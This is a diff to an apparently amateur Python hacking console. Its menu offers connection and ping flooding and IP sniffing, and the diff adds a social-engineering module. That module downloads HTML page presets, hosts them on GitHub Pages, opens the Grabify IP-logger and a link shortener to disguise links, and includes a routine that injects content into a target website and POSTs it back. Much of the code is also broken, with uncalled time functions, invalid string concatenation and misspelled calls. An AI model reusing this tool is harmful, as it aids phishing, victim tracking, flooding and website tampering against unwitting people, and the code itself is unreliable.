@@ -1,11 +1,16 @@
 import os
 import socket
+import requests
+from bs4 import BeautifulSoup
 import shutil
 import subprocess
 import urllib.request
+import time
 
 defaultpath = os.path.abspath(__file__)
 
+os.system("title kaosKonsole")
+os.system("color 04")
 while True:  
     print("___________________________________________________________________")
     print("                            _    _                                 ")
@@ -14,12 +19,20 @@ while True:
     print("  /(     /   ) /   ) (_ ` /  \     /   ) /   ) (_ ` /   ) /   /___)")
     print("_/___\__(___(_(___/_(__)_/____\___(___/_/___/_(__)_(___/_/___(___ _")
 
+    print(time.localtime)
+    print(time.ctime)
+    print(time.mktime)
+    print(time.daylight)
+    print("universal: " + time.gmtime)
+    print("perf: " + time.perf_counter)
+
     print("Connect to IP + Port: c")
     print("Sniff connections within a range: sniff")
     print("Sniff IP + Port status: pingsniff")
     print("Flood IP + Port with connections: flood")
     print("Flood IP + Port with pings: pingflood")
     print("Use pingo: pingo")
+    print("Social engineering: soc")
                                                                    
     x1 = input("Choose command: ")
     if x1 == "c":
@@ -79,6 +92,7 @@ while True:
                         shutil.copy2(filename, p65)
                         subprocess.run(['python3', '{}/{}'.format(p65, os.path.basename(filename))])
                         print(str(p65) + ":" + str(i) + ":" + str(f34) + " ^^")
+                        
                     except:
                         print(str(p65) + ":" + str(i) + ":" + str(f34) + " @w@")
                         pass
@@ -207,10 +221,173 @@ while True:
         except FileNotFoundError:
             print("u dont got that")
             break
+
+    elif x1 == "soc":
+        os.system("cls")
+        os.system("color 03")
+        os.system("title evileye")
+        print("                             ▒▒▒▒▓▓▒▒▒▒▓▓▒▒░░                         ")
+        print("                      ▓▓▒▒▒▒▒▒░░▓▓░░▒▒▒▒░░▓▓▓▓▒▒▓▓                    ")
+        print("                  ░░░░░░░░▒▒    ▒▒  ░░    ░░▒▒▒▒▒▒▓▓▒▒░░              ")
+        print("              ░░░░░░                    ░░▒▒░░░░░░░░▒▒▓▓▒▒░░          ")
+        print("            ░░░░░░                          ░░    ░░░░▒▒░░▓▓          ")
+        print("          ░░░░░░                  ░░▒▒░░            ░░▒▒▒▒▒▒▓▓        ")
+        print("        ░░░░░░░░                    ░░                ░░▒▒░░▒▒▒▒      ")
+        print("        ░░░░                                      ▒▒    ▒▒░░░░░░      ")
+        print("      ░░░░░░    ░░                                        ▒▒▒▒░░      ")
+        print("    ░░░░░░░░        ░░                                      ▒▒░░░░    ")
+        print("    ░░░░░░░░    ▒▒  ▒▒      ░░▒▒▓▓▓▓▓▓▒▒▒▒░░        ▒▒  ▒▒░░░░▓▓░░░░  ")
+        print("  ░░░░░░  ░░      ▓▓  ░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓░░  ░░░░░░░░░░░░░░░░░░  ")
+        print("  ░░░░                ░░▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒░░  ▒▒░░        ░░░░░░")
+        print("  ░░░░                ▒▒▒▒▒▒░░░░░░░░▒▒▒▒░░  ░░▒▒▒▒  ░░          ▒▒░░░░")
+        print("  ░░            ░░  ▒▒▒▒▒▒▒▒░░░░░░██▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░            ░░░░░░")
+        print("░░▒▒            ░░  ▒▒▒▒▒▒▒▒░░░░████▒▒██▒▒▒▒▒▒▒▒▒▒▒▒              ░░░░")
+        print("▒▒                  ▒▒▒▒▒▒▒▒░░▒▒████  ██▓▓▒▒▒▒▒▒▒▒▒▒          ░░  ░░░░")
+        print("░░░░        ▒▒      ▒▒░░▒▒▒▒▒▒▓▓██████████▒▒▒▒▒▒▒▒▒▒            ░░░░░░")
+        print("░░░░░░      ▒▒  ▒▒  ▒▒░░░░▒▒▒▒▓▓██████████░░▒▒▒▒▒▒▒▒  ░░        ░░▒▒░░")
+        print("░░░░            ░░  ▒▒░░░░  ░░▒▒▓▓██████░░░░▒▒▒▒▓▓▒▒  ░░░░        ░░░░")
+        print("░░▒▒            ░░  ░░▒▒▒▒░░░░░░▒▒▒▒▒▒░░░░░░░░▒▒▒▒░░            ░░░░░░")
+        print("  ░░░░░░░░            ▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░▒▒▒▒▒▒▒▒▒▒░░          ░░▒▒▒▒░░")
+        print("  ▒▒░░░░              ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒          ░░░░░░░░░░")
+        print("  ▒▒░░▒▒░░            ▒▒░░▒▒▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒            ░░▒▒░░░░  ")
+        print("    ░░▒▒▒▒░░░░        ░░    ▒▒▓▓▒▒▒▒▒▒▒▒▒▒░░              ░░  ░░░░░░  ")
+        print("    ░░▓▓▒▒▒▒░░          ▒▒                                ░░░░░░░░    ")
+        print("      ▒▒▓▓░░░░░░░░░░░░▒▒  ░░░░                            ░░░░░░      ")
+        print("        ░░░░░░▒▒▒▒▒▒  ▒▒                                ░░  ░░        ")
+        print("          ▒▒▒▒▒▒▒▒░░░░░░                              ▒▒░░░░░░        ")
+        print("            ░░▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒            ░░░░░░    ░░░░░░░░          ")
+        print("                ▓▓░░▒▒░░░░░░▒▒░░  ░░  ░░░░░░▒▒░░░░░░░░░░░░            ")
+        print("                  ░░▒▒▒▒▒▒░░▓▓▒▒▒▒░░░░▒▒░░░░░░░░░░░░                  ")
+        print("                        ▒▒▓▓▓▓▒▒▓▓▒▒░░░░░░░░░░                        ")
+
+        print(" ")
+        print(" ")
+
+        print(time.localtime)
+        print(time.ctime)
+        print(time.mktime)
+        print(time.daylight)
+        print("universal: " + time.gmtime)
+        print("perf: " + time.perf_counter)
+        
+        print(" ")
+        print(" ")
+        print("website")
+        print("email")
+        print(" ")
+        print(" ")
+
+        jj34 = input("Select a method for social engineering: ")
+        if jj34 == "website":
+            print("Which website method?")
+            print(" ")
+            print("host")
+            print("inject")
+            jo4 = input(" ")
+            if jo4 == "host":
+                    print("Would you like to download HTML presets?")
+                    jk23 = input("Y/N: ")
+                    if jk23 == "Y":
+                        print("perf: " + time.perf_counter)
+                        print("Downloading HTML presets..")
+
+                        url = "https://github.com/kaosSec/kaosTools/raw/main/js/htmldp1.html"
+                        filename = defaultpath + "\\" + "htmldp1.html"
+                        urllib.request.urlretrieve(url, filename)
+
+                        url = "https://github.com/kaosSec/kaosTools/raw/main/js/htmldp2.html"
+                        filename = defaultpath + "\\" + "htmldp2.html"
+                        urllib.request.urlretrieve(url, filename)
+                        continue
+                    elif jk23 == "N":
+                        continue
+
+                    print("How would you like to host the website?")
+                    print("github")
+                    mon4 = input(" ")
+                    if mon4 == "github":
+                        os.sytem("start https://github.com/new")
+                        print(time.localtime)
+                        print(time.ctime)
+                        print(time.mktime)
+                        print(time.daylight)
+                        print("universal: " + time.gmtime)
+                        print("perf: " + time.perf_counter)
+                        print(" ")
+                        print(" ")
+                        print("using github is pretty simple because of https://pages.github.com")
+                        print("join https://github.com/kaosSec, create your own organization, or have github pro and you can utilize this method")
+                        print(" ")
+                        print(" ")
+                        print("What link shortener?")
+                        print(" ")
+                        print("grabify")
+                        print("t.ly")
+                        print(" ")
+                        j61 = input(" ")
+                        if j61 == "grabify":
+                            print("  #####  ######  ######  #######    #    ######     #     #    #    #       #     #    #    ######  ####### ### ### ")
+                            print(" #     # #     # #     # #         # #   #     #    ##   ##   # #   #       #  #  #   # #   #     # #       ### ### ")
+                            print(" #       #     # #     # #        #   #  #     #    # # # #  #   #  #       #  #  #  #   #  #     # #       ### ### ")
+                            print("  #####  ######  ######  #####   #     # #     #    #  #  # #     # #       #  #  # #     # ######  #####    #   #  ")
+                            print("       # #       #   #   #       ####### #     #    #     # ####### #       #  #  # ####### #   #   #               ")
+                            print(" #     # #       #    #  #       #     # #     #    #     # #     # #       #  #  # #     # #    #  #       ### ### ")
+                            print("  #####  #       #     # ####### #     # ######     #     # #     # #######  ## ##  #     # #     # ####### ### ### ")                                                                           
+                            os.system("start https://grabify.link")
+                            print(time.localtime)
+                            print(time.ctime)
+                            print(time.mktime)
+                            print(time.daylight)
+                            print("universal: " + time.gmtime)
+                            print("perf: " + time.perf_counter)
+                        elif j61 == "t.ly":
+                            print("  #####  ######  ######  #######    #    ######     #     #    #    #       #     #    #    ######  ####### ### ### ")
+                            print(" #     # #     # #     # #         # #   #     #    ##   ##   # #   #       #  #  #   # #   #     # #       ### ### ")
+                            print(" #       #     # #     # #        #   #  #     #    # # # #  #   #  #       #  #  #  #   #  #     # #       ### ### ")
+                            print("  #####  ######  ######  #####   #     # #     #    #  #  # #     # #       #  #  # #     # ######  #####    #   #  ")
+                            print("       # #       #   #   #       ####### #     #    #     # ####### #       #  #  # ####### #   #   #               ")
+                            print(" #     # #       #    #  #       #     # #     #    #     # #     # #       #  #  # #     # #    #  #       ### ### ")
+                            print("  #####  #       #     # ####### #     # ######     #     # #     # #######  ## ##  #     # #     # ####### ### ### ")      
+                            os.system("start https://t.ly/")
+                            print(time.localtime)
+                            print(time.ctime)
+                            print(time.mktime)
+                            print(time.daylight)
+                            print("universal: " + time.gmtime)
+                            print("perf: " + time.perf_counter)
+            elif jo4 == "inject":
+                print("neat")
+                print(" ")
+                print(time.localtime)
+                print(time.ctime)
+                print(time.mktime)
+                print(time.daylight)
+                print("universal: " + time.gmtime)
+                print("perf: " + time.perf_counter)      
+                print(" ")
+                print(" ")
+                print("requests")
+                ml23 = input("method: ")
+                if ml23 == "requests":
+                    rita90 = input("website: ")
+                    ron60 = input("element to inject to: ")
+                    lenny44 = input("new tag: ")
+                    morgi11 = input("content to inject: ")
+                    rova = requests.get(rita90)
+                    sovi = BeautifulSoup(rova.content, 'html.parser')
+                    blik34 = sovi.find(ron60)
+                    x23 = sovi.new_tag(lenny44)
+                    x23.string = morgi11
+                    blik34.append(x23)
+                    jonah40 = requests.post(rita90, dta=str(sovi))
                 
     elif x1 == "3":
         print("bowza")
     elif x1 == "4":
         print("lowza")
+    elif x1 == "99":
+        print("bai :3")
+        os.system("cls")
+        exit()
     else:
         print("??")
